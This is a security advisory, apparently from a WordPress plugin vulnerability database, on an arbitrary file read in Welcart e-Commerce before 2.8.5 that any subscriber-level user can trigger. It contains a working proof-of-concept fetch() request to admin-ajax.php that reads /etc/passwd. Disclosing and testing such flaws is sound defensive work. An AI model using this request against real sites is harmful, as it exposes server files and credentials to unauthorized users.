## WordPress Plugin Vulnerabilities

# Welcart e-Commerce < 2.8.5 - Subscriber+ Arbitrary File Access

### Description

The plugin does not validate user input before using it to output the content of a file via an AJAX action available to any authenticated users, which could allow users with a role as low as subscriber to read arbitrary files on the server.

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as subscriber user
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": 'action=wel\_check\_progress\_ajax&progressfile=/etc/passwd',
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
